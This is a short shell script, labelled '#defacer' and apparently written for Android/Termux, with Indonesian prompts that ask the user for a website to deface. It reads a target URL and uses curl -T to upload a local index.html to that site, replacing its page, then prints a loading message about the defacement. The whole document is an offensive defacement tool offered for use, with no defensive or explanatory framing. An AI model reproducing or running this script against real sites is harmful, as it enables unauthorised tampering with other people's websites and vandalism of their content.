#defacer

echo  "| Masukkan situs yang ingin di Deface!!!                              |"
echo  "| ╭─""[ user91 ]"" ~/RCA Duty                                             |"
read -p "| ╰─$ "  target
curl -T/storage/emulated/0/index.html $target
echo  "|"
echo  "|          [""LOADING""]"" process Deface to"" $target"
